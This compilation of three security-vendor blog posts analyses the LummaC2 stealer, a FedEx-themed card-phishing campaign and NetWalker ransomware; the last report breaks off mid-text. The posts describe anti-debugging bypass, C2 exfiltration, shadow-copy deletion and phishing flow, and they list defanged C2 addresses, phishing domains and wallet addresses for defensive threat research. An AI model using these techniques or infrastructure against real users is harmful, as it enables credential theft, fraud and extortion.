Distribution Methods Infected email attachments, malicious online advertisements, social engineering, software ‘cracks.’ 
Damage Stolen passwords and banking information, identity theft, and the victim’s computer added to a botnet. 
The LummaC2 stealer begins its operations by obtaining relevant device data, such as OS version and architecture, hardware ID, CPU, RAM, screen resolution, system language, etc.
This malware can exfiltrate files and extract data from specific applications.
Browsers targeted by LummaC2: Chrome, Chromium, Mozilla Firefox, Microsoft Edge, Brave, Kometa, Opera GX Stable, Opera Neon, Opera Stable, Vivaldi, and others.
This stealer may acquire browsing histories, Internet cookies, usernames/passwords, personally identifiable details, credit card numbers, and other highly sensitive information from browsers.
LummaC2 also targets multiple cryptocurrencies (e.g., Binance, Electrum, Ethereum, etc.).
In summary, software like LummaC2 on devices can result in severe privacy issues, significant financial losses, and identity theft. 
Lumma Stealer Composition With the Lumma Stealer malware hash in hand, we visited Malware Bazaar and Triage, where malware samples can be downloaded.
We searched for the hash value and finally downloaded the malware from the Triage site, completing the first step of our analysis.
Since the sample we obtained is a PE file, when we run it after the appropriate environment is prepared and watch its mobility, it continues to run under the name “tmp.exe” by unpacking itself to the “C:\Users\admin\AppData\Local\Temp\” file path. 
Process Name Command Line tmp.exe C:\Users\admin\AppData\Local\Temp\tmp.exe Behavior Activities: tmp.exe Infostealers often target stored browser data, which can include saved credentials etc. 
Registry Key Sets: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\SavedLegacySettings HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable 1 HKU\S-1-5-21-575823232-3065301323-1442773979-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer %HTTP_PROXY%:8080 Reads browser cookies and saves this path: C:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\ymgarh1v.defaul t\cookies.sqlite Connects to the server without a hostname. 
hxxp[:]//195[.]123[.]226[.]91/c2sock 
After the connection to the address is established, it transmits information as a zip file.
Details are given in other stages. 
Static Analysis Overview File Name tmp.exe File Size 158 KB File Type Win32.exe MD5 c9c0e32e00d084653db0b37a239e9a34 SHA-1 b97965e4a793ec0fa10abc86d0c6be5718716d8a SHA-256 d932ee10f02ea5bb60ed867d9687a906f1b8472f01fc5543b06f9ab22059b264 When Lumma is analyzed in various tools, the outputs of the tools are as follows: It is written in C++ programming language. 
Detect It Easy tool’s output is the total ‘6.51920’ entropy value, which turns out 81%. 
PEStudio tool’s output is total ‘6.519‘ entropy value. 
In addition to the entropy value, we can view all functions and imported addresses when we examine them with IDA.
At this stage, we decide that it is not packed, and when we finally check with the “exeinfope,” the result is “not packed.” 
Strings have been searched, but since there is too much obfuscated information, no tangible results have been found.
One remarkable result we achieved using PEStudio was that it uses ASLR.
We will continue the analysis by changing the ASLR ‘true‘ parameter to ‘false‘ and saving it. 
Anti-Debugger control is provided with “IsDebuggerPresent” API.
If the EAX register takes 1 as a value, the program will close itself, and it is impossible to debug with the analysis tools; that’s why changing it to 0 to run the program without closing.
The anti-debugger bypass technique will be done during dynamic analysis. 
The beginning of obfuscated strings and the field where browser cookie information is collected.
The stealer also targets crypto wallets such as Binance, Electrum, and Ethereum and collects sensitive information from the victim’s machine.
The below figure shows the code snippet of stealers targeting crypto wallets.
(0040772c) 
Here are the obfuscated collections. 
Crypto Wallets: Deobfuscated strings come after. 
Web Browsers: Deobfuscated strings come after. 
The stealer has many obfuscated strings that are being covered by a random string, “edx765“, to evade detection.
Upon execution, the stealer passes the obfuscated string to a function that strips the arbitrary string and delivers the original string.
The results obtained by decoding strings are compared below. 
Dynamic Analysis We have started with the first findings we detected while running LummaC2 Stealer in the “behavior” section.
Now, let’s move on to the detailed dynamic analysis stage, verify what we found in the “static analysis” section, and check if we can change the request to the C2 address. 
IsDebuggerPresent By changing the return value for IsDebuggerPresent, one of the most critical APIs we put in breakpoint, we perform the anti-debugging bypass operation. 
LummaC2 stealer sends this information to its C2 server, as shown below. 
Type: multipart/form-data; boundary=Ð¾aj195iak20ka99441aj1″ We observed the IP address in Debugger, and via IDA, we found that the exact IP address is also referred to in the .rdata section. 
Host: 195[.]123[.]226[.]91/c2sock One of the parts that will complicate the analysis processes that will perform the termination process has appeared again.
If we try to skip this part directly, the process will terminate. 
Network Activity When LummaC2 is run, the address it sends the POST request to and the C2 addresses are different.
We found the C2 address by researching VirusTotal.
We ran the LummaC2 instance directly in the virtual environment and monitored its activity.
As a result, network activity was observed.
Making a ‘POST’ request, tmp.exe is trying to pass information. 
The POST request is performed as follows. 
Host: 195[.]123[.]226[.]91 You can find Shodan results about the host address here. 
When we examine the packet’s content captured with WireShark, we see a “PK” header.
This means that the C2 is transmitted as a zip file during the POST request.
Let’s examine the stolen information by dumping the zip file. 
Content-Disposition: form-data; name=”hwid” {78494464-3fdf-11ed-8279-806e6f6e6963} Content-Disposition: form-data; name=”pid” 1 Content-Disposition: form-data; name=”lid” xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx When we examine the contents of the zip file viewed from the PCAP file, it collects information, primarily system information.
It targets the browsers we have seen in the static analysis codes.
The collected data is transferred to the C2 server as a zip file.
Since Microsoft Edge and Mozilla Firefox are installed in our analysis environment, Lumma Stealer only collects data from these browsers. 
We have obtained different zip files because Lumma Stealer sent multiple POST requests to the “c2/sock” address.
When we begin examining from the lowest to the highest in size, we find only the “System.txt” file in the lowest size file.
Its contents are specified in the following image. 
When we examine the file named Mozilla Firefox, when we view the .db file called cookies, we can see that it collects the following cookie information. 
The content of the .db file named web data is shown in the image below. 
There is not much data for the Edge browser, so when we add the cookie information collected for Mozilla, we can see clearly in the following image that it has collected cookie information for many account details. 
In conclusion, Lumma Stealer collects cookie information, search histories, and key inputs from browsers and transfers them to the C2 address.
The list of all the information it tries to collect inside of the “Web Data” SQLite file is given in the last image. 
We used the VirusTotal graphical interface for Threat Research at this research stage with the IP address sending the POST request.
As seen in the screenshot below, the results of “collections,” “communicating files,” and “referer files” are displayed. 
After that, we opened the link information, and many malicious files and IP addresses were displayed.
We noticed a large number of open ports when we searched through Shodan, where 144[.]76[.]173[.]247 IP addresses in Germany caught our attention.
We accessed C2 while visiting port 80. (VirusTotal Graph: Collection) 
In the next step, when we visit port 80, the login page can be displayed.
C2 Login Page is shown in the screenshot below. 
C2:144[.]76[.]173[.]247/login Analyst Note: 
The IP address 144[.]76[.]173[.]247 was not encountered during the analysis. 
Shodan Result Communication Addresses Requests 195[.]123[.]226[.]91 POST /c2sock: multipart/form-data;boundary=оaj195iak20ka99441aj1 144[.]76[.]173[.]247 GET/login LummaC2 behaves like other stealer-type malware, which can take away system and sensitive data from the victim’s machine.
These dangerous programs can usually steal information from web browsers and target crypto wallets. 
The additional information stored on web browsers, such as login credentials, PII, and financial information, can be further leveraged to conduct fraud activities. 
Threat actors can use the stolen data to steal cryptocurrencies from the victim’s accounts or sell this data to other threat actors for financial gain. Indicators of Compromise You can find the full list of IOCs in the SOCRadar Platform. 
Rules & Signatures MITRE ATT&CK Matrix Discovery System Information Discovery T1082 Defense Evasion Debugger Evasion T1622 Defense Evasion Deobfuscate/Decode Files or Information T1140 Defense Evasion Impair Defences T1562 Collection Automated Collection T1119 Collection Data from the Local System T1005 Command and Control Application Layer Protocol T1071 Exfiltration Automated Exfiltration T1020 The post Malware Analysis: LummaC2 Stealer appeared first on SOCRadar:registered: Cyber Intelligence Inc.. 
title: FedEx Phishing Campaign Abusing TrustedForm and PAAY url: https://www.netskope.com/blog/fedex-phishing-campaign-abusing-trustedform-and-paay Summary Netskope Threat Labs is tracking a phishing campaign that mimics a FedEx package delivery as bait to steal credit card data.
This type of social engineering attack is commonly found in phishing pages, emails, and other scams, where a false sense of urgency is created to urge the victim into doing an action that eventually leads to personal data theft. 
This specific phishing campaign is noteworthy because it abuses two cloud services throughout the attack: TrustedForm, a digital certificate service provided by ActiveProspectis, is abused to track victims and collect information about them, and the PAAY 3DS, a cloud-based platform that authenticates payment transactions, is abused to validate the credit card details collected from the victims. 
Cybersecurity awareness training, specifically educating users to be wary of fake shipment notifications, is an effective defense against these types of phishing attacks.
Netskope customers also receive protection from the threats discussed in this blog through the Next Generation Secure Web Gateway (SWG). 
First Stage – Deception 
The attack starts when the victim receives an email or a text message that uses a common social engineering technique, creating a false sense of urgency to get the victim’s attention. 
The specific approach here, using a fake shipping notification, is also a common technique used by scammers. 
First steps of this FedEx phishing campaign. 
Step 1 – Once the victim reaches the page via phishing email or SMS text, they are instructed to click “Confirm” to view a message from “Express.”
This webpage has “FedEx” in the title and uses the same company colors to deceive the user.
The user is also asked to permit push notifications in the browser, which allows the attacker to push malicious ads, as we will demonstrate later in this analysis. 
Step 2 – The victim is informed that delivery of a package has been suspended, and that they need to schedule delivery and should enable push notifications to avoid future issues. 
Step 3 – Then, the victim is informed that they need to pay a $1.95 customs fee.
The customs fee is just an excuse to collect the victim’s personal and credit card data in the next stage of the attack. 
Behind the scenes, once the first page is loaded, the page sends a request to receive a customizable JSON that is used throughout the attack.
The JSON includes the questions, form fields, and second-stage URLs, which will be all used in the next steps. 
JSON containing data about the phishing. 
Fake questions displayed by the phishing page. 
Step 4 – The attacker continues to deceive the victim, in an attempt to add more credibility to the phish, by asking a series of questions to the victim, such as how, where, and when the victim would like to receive the package. 
Step 5 – The deception continues by giving the victim a delivery estimate.
As soon as the victim interacts with the questions on step 4, the phishing starts sending requests to the TrustedForm API.
TrustedForm is a digital certificate service provided by ActiveProspect, which provides marketing automation and compliance platforms. 
This service can be used to generate a digital certificate that includes information about a lead, such as geolocation, IP address, browser type, operating system, the time spent on the page, and even a web session replay.
We believe that the attacker is creating a TrustedForm certificate to collect more information about victims. 
Phishing page abusing TrustedForm. 
Below is the type of information that would be available in a TrustedForm certificate, as demonstrated in their demo webpage. 
Examples of a TrustedForm certificate generated by their demo page. 
And finally, the phishing page redirects the victim to the next stage, using a URL parsed from the JSON we demonstrated earlier.
This page returns a second URL, which is used to redirect the user to a third URL.
This is done to add resilience, as the attacker can update the URLs with little effort if the last stage is taken down. 
Phishing page redirecting the victim to the next stage. 
Second Stage – Stealing Credit Card Data Once the attacker convinces the victim about the allegedly suspended package, they try to steal the victim’s credit card number on a different page. 
Phishing trying to steal personal and credit card data. 
Step 6 – This page asks for the victim’s personal information, such as the full name, phone number, and email address. 
Step 7 – Then, the page asks for credit card details and uses PAAY to assess whether the credit card is valid.
This is done by using their 3DS (3-D Secure) system, which is a protocol designed to add more security and prevent fraud in online purchases. 
Once the credit card data is entered in the page, it starts sending requests to the 3DS API, which performs a temporary purchase in the credit card number.
If the credit card is invalid, the phishing does not move forward. 
Phishing page abusing PAAY 3DS service. 
Spreading Adware As demonstrated earlier, the main page asks for permission to show notifications in the browser.
Unsurprisingly, if the victim allows notifications, they are bombarded with ads from the “virtualpushplatform[.]com” domain, including ads for fake antivirus software, fake coupons, and free iPads. 
Phishing page asking permission to show notifications. 
These ads lead to webpages that eventually ask for personal information or try to download malware.
So, even in case the phishing attack fails at any stage, if the victim allows notifications, they will still be targeted with additional scams. 
Ads displayed if the victim enabled the notifications in the phishing page. 
Conclusions By abusing cloud services, attackers are able to create more elaborate phishing pages that are also more resilient to detection.
This phishing campaign is not only trying to steal data from victims, but also abuses browser notifications to bombard victims with additional scams even if this one is unsuccessful.
Netskope uses ML-based inline, out-of-band phishing detection engines, and threat intelligence systems to block such phishing attempts. 
Recommendations Phishing pages from the campaign described in the post are easily recognizable by the URL, as the attacker has made little effort to disguise the URL using typosquatting or other techniques.
We strongly recommend users to never enter their data on pages that promise something, such as the delivery of a supposedly suspended package.
If you are indeed expecting a package, make sure to access the website of the logistics company directly. 
Netskope Threat Labs also recommends that organizations review their security policies to ensure that they are adequately protected against these and similar phishing pages and scams: Inspect all HTTP and HTTPs traffic, including all web and cloud traffic, to prevent users from visiting malicious websites.
Netskope customers can configure their Netskope NG-SWG with a URL filtering policy to block known phishing and scam sites, and a threat protection policy to inspect all web content to identify unknown phishing and scam sites using a combination of signatures, threat intelligence, and machine learning.
Use Remote Browser Isolation (RBI) technology to provide additional protection when there is a need to visit websites that fall in categories that can present higher risk, like Newly Observed and Newly Registered Domains. 
IOCs Below are the IOCs related to the web pages analyzed in this blog post. 
URLs hxxps://biriata[.]com/ff0787bfecd727e800/7_783335_2683580/2357_2741426_4412557_61/505175864_163-116-145-33 hxxps://entfernza[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=f8e48861-bc10-40e7-bd05-e152979e4ee7&sub1=ECVD_470446&sub5=0c1fd02a-51fd-474b-8954-1b700f38e0b9 hxxps://giggingge[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=b3beae86-91be-4ef4-8d2e-6f0a07b6ce7d&sub1=ECVD_470446&sub5=ee2c5954-324d-43da-8830-00445bd703e8#!/hst hxxps://obtrusiho[.]com/sf/tpl36/?item=KE9Q&logo=01f&session_id=eb178549-389d-4fd5-aa8c-adc714552d94&sub1=ECVD_470446&sub5=6a64a541-0f1f-4cc0-b655-3048f97e148e#!/hst hxxps://crisplyoo[.]com/sf/tpl36/0?item=KE9Q&logo=01f&session_id=742f8239-2017-4771-a6dc-ee09dc744bad&sub1=ECVD_470446&sub5=e4fdd22d-4394-49cf-8742-403d38df3a8c#!/hst hxxps://vod-7.zoonosisdewlap[.]com/ hxxps://v2-check.caducitymatroclinic[.]com/ hxxps://v2-check.turriferouscouloir[.]com/ hxxps://v2-check.diphysitismphotophile[.]com/ Domains biriata[.]com entfernza[.]com giggingge[.]com obtrusiho[.]com crisplyoo[.]com vod-7.zoonosisdewlap[.]com v2-check.caducitymatroclinic[.]com v2-check.turriferouscouloir[.]com v2-check.diphysitismphotophile[.]com The post FedEx Phishing Campaign Abusing TrustedForm and PAAY appeared first on Netskope. 
title: Take a “NetWalk” on the Wild Side url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/take-a-netwalk-on-the-wild-side/ Executive Summary The NetWalker ransomware, initially known as Mailto, was first detected in August 2019.
Since then, new variants were discovered throughout 2019 and the beginning of 2020, with a strong uptick noticed in March of this year. 
NetWalker has noticeably evolved to a more stable and robust ransomware-as-a-service (RaaS) model, and our research suggests that the malware operators are targeting and attracting a broader range of technically advanced and enterprising criminal affiliates. 
McAfee Advanced Threat Research (ATR) discovered a large sum of bitcoins linked to NetWalker which suggest its extortion efforts are effective and that many victims have had no option other than to succumb to its criminal demands. 
We approached our investigation of NetWalker with some possible ideas about the threat actor behind it, only to later disprove our own hypothesis.
We believe the inclusion of our thinking, and the means with which we debunked our own theory, highlight the importance of thorough research and we welcome further discussion on this topic.
We believe it starts valuable discussions and helps avoid duplicate research efforts by others.
We also encourage our peers in the industry to share information with us in case you have more evidence. 
McAfee protects its customers against the malware covered in this blog in all its products, including personal antivirus, endpoint and gateway.
To learn more about how McAfee products can defend against these types of attacks, visit our blog on Building Adaptable Security Architecture Against NetWalker. 
Check out McAfee Insights to stay on top of NetWalker’s latest developments and intelligence on other cyber threats, all curated by the McAfee ATR team.
Not only that, Insights will also help you prioritize threats, predict if your countermeasures will work and prescribe corrective actions. 
Introduction Since 2019, NetWalker ransomware has reached a vast number of different targets, mostly based in western European countries and the US.
Since the end of 2019, the NetWalker gang has indicated a preference for larger organisations rather than individuals.
During the COVID-19 pandemic, the adversaries behind NetWalker clearly stated that hospitals will not be targeted; whether they keep to their word remains to be seen. 
The ransomware appends a random extension to infected files and uses Salsa20 encryption.
It uses some tricks to avoid detection, such as a new defence evasion technique, known as reflective DLL loading, to inject a DLL from memory. 
The NetWalker collective, much like those behind Maze, REvil and other ransomware, threatens to publish victims’ data if ransoms are not paid. 
As mentioned earlier, NetWalker RaaS prioritizes quality over quantity and is looking for people who are Russian-speaking and have experience with large networks.
People who already have a foothold in a potential victim’s network and can exfiltrate data with ease are especially sought after.
This is not surprising, considering that publishing a victims’ data is part of NetWalker’s model. 
The following sections are dedicated to introducing the NetWalker malware and displaying the telemetry status before moving on to the technical malware analysis of the ransomware’s behaviour.
We will explain how the decryptor works and show some interactions between NetWalker’s operators and their victims.
After this, we discuss the changes in modus operandi since September 2019, especially regarding payment behaviour.
Then we show our attempts, unfruitful as they were, at discovering a link between NetWalker and previous, seemingly unrelated ransomware variants.
Finally, we deliver an overview of IOCs related to NetWalker and its MITRE ATT&CK techniques. 
Telemetry Using McAfee’s billion Insights sensors, we can show the global prevalence of the NetWalker ransomware. Figure 1.
McAfee MVISION Insights shows global prevalence of the NetWalker ransomware Technical Analysis Ransom note (pre-March 2020) 
Before March 2020, the NetWalker ransom note indicated how to contact the adversary directly using anonymous email account services with random names (such as kkeessnnkkaa@cock.li and hhaaxxhhaaxx@tuta.io): Figure 2.
Example of ransom note prior to March 2020 Ransom Note (Post-March 2020) 
On 12 March 2020, a researcher shared a screenshot of a new NetWalker ransom note in a tweet and we can see that the attackers have changed the contact method significantly.
Email communication has been dropped completely with victims now required to make contact through the NetWalker Tor interface where, after submitting their user key, they will then be redirected to a chat with NetWalker technical support.
This change in contact method coincides with underground forum postings where NetWalker revealed it was opening its RaaS up for new affiliates.
The Tor page was not the only noticeable change we will highlight in this blog. 
Figure 3.
Example of ransom note after March 2020 NetWalker Analysis Figure 4. NetWalker behavior NetWalker Resource Analysis (Pre-March 2020) 
The NetWalker malware uses a custom resource type (1337 or 31337) containing its entire configuration.
This file is extracted to memory and decrypted using the RC4 algorithm with a hard-coded key in the resource. 
Before 12 March 2020, NetWalker used the email contact process between its support operation and the victims to proceed with payment and send the decryption program.
To do this, NetWalker used its configuration file in the resource to set its encryption mode, the name of the ransom note, etc., and email contacts. 
Name wwllww.exe Size 96256 bytes File-Type EXE SHA 256 58e923ff158fb5aecd293b7a0e0d305296110b83c6e270786edcc4fea1c8404c Compile time 6 December 2019 Figure 5.
NetWalker resource from wwllww.exe Once decrypted, the configuration file reveals several parameters, allowing us to understand how it works (how it constitutes the ransom note, the number of threads allocated for encryption, etc.): mpk Public key mode Encryption mode thr Allocated threads for encryption process spsz Encryption chunk namesz Name length idsz ID length crmask .mailto[email].{ID} mail Contact mail lfile Ransom Note name lend B64 encoded ransom note white Encryption whitelist kill Processes, tasks, service names to terminate unlocker Decryption exclusion list NetWalker Resource Analysis (Post-March 2020) 
When Netwalker changed its contact mode and switched from email to the submission of the user key directly on the web portal of the group’s blog, the configuration file in the resource also changed. 
We found changes in the configuration file, such as the disappearance of the contact “mail” and “crmask” fields (previously set as XXX@cock.li,XXX@tuta.io, etc., and .mailto[email].{ID}).
This field was replaced by “onion1” and “onion2”, and these fields are set with the NetWalker blog URL/payment page (hxxp://rnfdsgm<snip>drqqd.onion/).
We also noticed that the NetWalker developers complemented their “unlocker” field with some specific values (e.g. “psexec.exe, system, forti*.exe, fmon.exe*, etc”). 
Name cnt.ex Size 70656 bytes File-Type EXE SHA 256 26dfa8512e892dc8397c4ccbbe10efbcf85029bc2ad7b6b6fe17d26f946a01bb Compile time 2 May 2020 Figure 6.
NetWalker resource from cnt.ex Usually, attackers use RC_DATA or a malicious BITMAP.
The latter can, for example, be a regular Bitmap (open matrix image format used by Windows) that can be used by malware to execute code or as a payload dropper.
The image’s pixels are an actual binary representation of the payload.
This process can be summarized as Exe -> Resources -> BMP with embedded data in pixels fetched and decrypted by, e.g. a DLL -> Payload), etc.
However, in this case, they use this special custom type to increase obfuscation.
The NetWalker developers chose custom types by using 1337 or 31337 structs, so the resource format does not change.
However, as we said, several values have changed or been replaced: mpk Public Key mode Encryption mode spsz Encryption chunk thr Allocated threads for encryption process namesz Name length idsz ID length lfile Ransom Note name onion1 Blog URL 1 onion 2 Blog URL 2 white Encryption whitelist kill Processes, tasks, service names to terminate net Network resources encryption unlocker Decryption exclusion list lend B64 encoded ransom note NetWalker Executable Analysis (Post-March 2020) 
The malware sample used for this blog post has the same information: Name c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Size 70656 bytes File-Type EXE SHA 256 c21ecd18f0bbb28112240013ad42dad5c01d20927791239ada5b 61e1c6f5f010 Compile time 2 May 2020 
The unpacked malware is a binary file of 32 bits that can be found as an EXE file. 
Figure 7.
Information sample of the malware The malware’s first action is to combine all the required functions it needs into one large function, combining the modules already loaded in Windows with additional DLLs as described below. 
Instead of searching for the function in the usual way, the malware makes a CRC32 hash of the name of each function and compares with hardcoded values.
Additionally, instead of using the function “GetProcAddress”, the malware uses the Process Environment Block (PEB) to make analysis harder. Figure 8.
Get the module accessing the PEB and using a CRC32 
If the module cannot be discovered, it will load with “LdrLoadDll”, a native function of Windows, to try avoiding hooks in the usual functions, e.g. “LoadLibraryW”: Figure 9.
Load library using LdrLoadDll Figure 10.
Get functions from module, e.g. using a CRC32 hash If the malware fails to get a function, it will go to a “sleep” call and terminate itself. 
Later, the malware extracts the configuration file from a resource with a custom type and a custom name using the functions “FindResourceA”, “LockResource”, “LoadResource” and “SizeOfResource”.
The file extracted in memory is decrypted using the RC4 algorithm with a hardcoded key in the resource. 
The struct of the resource is: 4 bytes ->
The size of the hardcoded key to decrypt the configuration file. 
Variable size -> the hardcoded key to decrypt the configuration file. 
Variable size -> the configuration file encrypted. 
The malware reads the first 4 bytes and reserves memory with the size of the password and reserves memory of the resource minus 4 bytes and the size of the password.
Finally, it decrypts the configuration file: Figure 11.
Get configuration file and decrypt it If the malware fails to get the configuration file, it will terminate itself. 
After getting the configuration file, the malware will parse it and save the fields in memory and write in the registry information to encrypt the files in the machine.
The malware will try first to write in the registry-hive “HKEY_LOCAL_MACHINE” but if it cannot create it, it will use the registry-hive “HKEY_CURRENT_USER”: Figure 12.
Write in the registry After the writing in the registry has been completed, it will get some privileges using a token as SE_DEBUG_PRIVILEGE and SE_IMPERSONATE_PRIVILEGE: Figure 13.
Get some special privileges in the token Later, the malware creates three threads, one to get information about the machine, such as the operating system version, one to get processes and the last one to get services in the system. 
After this step, it will get the system directory and use “VSSadmin” to delete the Volume Shadow copies of the system.
Volume Shadow copies can contain copies of the encrypted files and would be an option to restore from if no backup exists. 
Figure 14.
Delete the shadow volumes Later, the malware will enumerate the logical units, prepare the new extension for the future encrypted files, based on the size that is defined in the ransomware config with a random extension, and encrypt all files in the fixed type units and remote units with the new extension. 
Figure 15.
Crypt the files After all these steps have been completed, it will create the ransom note on the desktop using the functions “SHGetFolderPathlW” and “CreateFileW”.
Subsequently, it will write the ransom note from the memory into a new file with the function “WriteFile”.
The malware will create the ransom note in the root folder (for example “c:\”) of each logical unit.
Next, it will launch “notepad.exe” with an argument to the ransom note file to show the user what happened on the system: Figure 16.
Creation of the ransom note in the desktop and root units Finally, after the encryption of the files and creation of the ransom note, the malware creates a bat file in the %temp% folder of the machine with a temporary name and writes the content to destroy itself using the program “taskkill”.
The batch script will delete the malware sample with its path using the command “del” and finally delete the bat file with the command “del %0%”.
Of course, as the malware uses the “del” command without destroying itself before the deletion, it can be recovered with some forensic tools with luck (the same can also be said for the bat file). 
This way the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers: Figure 17.
Get Temp path and make a temporary file as a bat and launch it Finally, the malware will finish with “ExitProcess”. 
Decryptor When a NetWalker victim goes through technical support (see an example of this below) and pays the ransom demanded by the group they will be able to download the decryptor to clean up their environment. 
Figure 18.
Conversation with NetWalker operators The download is done directly from the NetWalker Tor site, where the payment page switches to a download page certifying that the payment was made and received: Figure 19.
Decryptor download The decryptor is delivered in a zip archive containing the decryptor executable and a note explaining how to run the program correctly: Figure 20.
Decryptor delivery The program launches a graphical interface allowing the user to decipher their workstation automatically or manually: Figure 21.
Decryptor execution At the end of the decryption process, the program indicates the number of decrypted files, deletes the ransom note if the user has checked that option, and terminates, leaving the user to resume their work peacefully: Figure 22.
Decryptor has finished the decryption process The decryptor program appears unique and is linked to one victim specifically.
In our example, it only decrypts the files belonging to the victim who made the payment from the user key specified in the ransom note. 
Underground Advertising In March 2020, the moniker Bugatti began actively advertising the NetWalker Ransomware-as-a-Service on two popular underground fora.
Bugatti seems to have joined the underground scene in February 2020 but claims to have been active with NetWalker ransomware since September 2019.
We have seen NetWalker activity before March but there has been a noticeable uptick in larger victims since their advertisement.
For a relatively new ransomware it has been well received and respected among other cybercriminals as compared to, for instance, Nemty ransomware.
The strength of NetWalker’s reputation is such that our current hypothesis is that the individual behind Bugatti is most likely a well-respected and experienced cybercriminal, even though it is a new moniker. 
Figure 23.
Bugatti advertising NetWalker on an underground forum Bugatti provides regular updates on the improvements in the ransomware, such as the popular Invoke-ReflectivePEInjection method, also commonly used by Sodinokibi.
In addition to the improvements in the ransomware, open slots for new affiliates are advertised.
Bugatti strongly emphasized that they are primarily looking for experienced affiliates that focus on compromising the complete networks of organizations as opposed to end users.
NetWalker is clearly following in the footsteps of its illustrious targeted ransomware peers like Sodinokibi, Maze and Ryuk. 
One forum message in particular caught our attention as it included screenshots of several partial bitcoin addresses and USD amounts.
This was most likely done to showcase the financial success of the ransomware.
We have seen a similar posting in the past with the influential Sodinokibi affiliate Lalartu, so we decided to follow the money once more. Figure 24.
Bugatti is looking for advanced affiliates and shows samples of BTC payments With the help of CipherTrace software we were able to find the complete BTC addresses from the screenshot and investigate the ledger further: Screenshot 1 3JHTYZhRmMcq7WCKRzFN98vWvAZk792w9J Screenshot 2 39aovzbz5rGoQdKjDm6JiybkSu1uGdVJ2V Screenshot 3 39NRnZtgACDVhhmc7RwmvH9ZDUKTNwwaeB Screenshot 4 3L4AW5kHnUCZBBjg2j1LBFCUN1RsHPLxCs Following the Money In the transactions mentioned in the underground forum post, the ransom amount payed by the victims is presumably shown.
Since the bitcoin blockchain is a publicly accessible ledger, we can follow the money and see where the ransomware actors are transferring it to.
In the case of the four posted transactions above, the full amount payed by the victim was transferred to two addresses (these addresses begin with bc1q98 and 1DgLhG respectively).
It is safe to say that these two bitcoin addresses are under control of the NetWalker actors.
We then proceeded on to analyze all incoming transactions to these two addresses and we were able to make the following observations: The first incoming transaction occurs on 1 March 2020. 
On 30 March 2020 the first incoming transaction appears where the amount is split between 4 different bitcoin addresses.
A split like this is typically seen in Ransomware-as-a-Service, where the ransom payment is split between the RaaS operators and the affiliate who caused the infection.
In this first transaction, the split is 80%, 10% and two 5% portions.
This split matches the advertisement on the underground forum (80% – 20%). 
The two 5% portions of the ransom payments that are split, seem to be consistently transferred to the two bitcoin addresses we revealed earlier (bc1q98 and 1DgLhG). 
While the beneficiaries of the 5% cuts remain the same, the beneficiary of the 10% cut seems to change over time.
Based on the forum post we assume these addresses also belong to the NetWalker actors. 
Payments to the bc1q98 and 1DgLhG addresses that are not being split continue up until the end of May.
Possibly the initial NetWalker operators added a RaaS operation, while continuing to cause NetWalker infections themselves. 
While analyzing the bitcoin addresses that received 80% or more of the transaction amount, we noticed that there are some addresses that receive payments multiple times.
A possible explanation could be that the address is configured as payout addresses for a certain campaign or affiliate.
We identified 30 unique bitcoin addresses that seem to be the beneficiary of this larger portion of the ransom transaction.
Some of these only received one payment but there are several that received multiple payments. 
In the two addresses uncovered by tracing the transactions a total of 641 bitcoin is held on 27 July 2020.
Which at the current market value of bitcoin is worth well over 7 million USD. 
Amounts Extorted Working under the hypothesis that all the incoming transactions are ransomware payments; we can make the following observations: We found 23 transactions where the ransom payments were not split up and the beneficiaries are the two bitcoin addresses found by following the transactions mentioned in the underground forum post.
The total amount of bitcoin extorted this way between 1 March 2020 and 27 July 2020 is 677 BTC.
Additionally, the amount received from remaining transactions following the Ransomware-as-a-Service scheme by these addresses between 1 March 2020 and 27 July 2020 is 188 BTC. 
In the transactions that are split, the largest amount (usually 80% to 90% of the total transaction value) is presumably transferred to the affiliate that caused the infection.
When we summed up these largest portions, we saw a total of 1723 BTC being transferred to affiliates. 
The total amount of extorted bitcoin that has been uncovered by tracing transactions to these NetWalker related addresses is 2795 BTC between 1 March 2020 and 27 July 2020.
By using historic bitcoin to USD exchange rates, we estimate a total of 25 million USD was extorted with these NetWalker related transactions. 
Even though we do not have complete visibility into the BTC flow before NetWalker started ramping up, one thing is certain, this quarter alone it has been highly successful at extorting organisations for large amounts of money.
All this at a time when many sectors are struggling because people are sheltering in place and governments are trying to keep businesses from going bankrupt.
NetWalker is making millions off the backs of legitimate companies. 
Figure 25.
Overview of uncovered bitcoin transactions, highlighting the two identified actor addresses. 
Observed Changes While talking about the impact of NetWalker with our partners, we learned that the change in modus operandi not only affected the way the actors communicate with their victims.
When there was a change from email communication to a dedicated Tor hidden service, the actors also moved away from using legacy bitcoin addresses to SegWit addresses.
The benefits of using the newer SegWit addresses include faster transaction time and lower transaction cost.
The NetWalker advertisement on the underground forum mentions instant and fully automatic payments around the time of this observed change.
This makes us believe the ransomware actors were professionalizing their operation just before expanding to the Ransomware-as-a-Service model. 
Comparison with Previous Ransomware Given the sudden appearance of NetWalker ransomware and the associated threat actor, it suggests that some prior knowledge on ransomware development or underground presence had to be in place.
Armed with this hypothesis, we searched for possible links to underground actors and other ransomware strains that might fit the bill.
We came across one threat actor offering ransomware that caught our attention.
It was the use of the name NetWalker, in combination with a strong ransomware connection, that sparked our interest. 
Some years ago, a threat actor using the moniker Eriknetwalker was advertising ransomware on several underground forums.
We found posts from 2016 and the latest public activity was around June 2019, several months before NetWalker ransomware made its appearance. 
Figure 26.
Eriknetwalker began advertising their ransomware in 2016 (Google-translated from Russian) 
Based on our underground research, we linked the moniker Eriknetwalker to the development and/or distribution of Amnesia, Bomber and Scarab ransomware.
Eriknetwalker stopped advertising ransomware around June 2019.
Therefore, we decided to perform a comparative analysis between the different ransomware strains linked to Eriknetwalker and some of the earliest versions of NetWalker we could find. 
The goal of this comparative analysis was to identify whether there was an overlap between source codes.
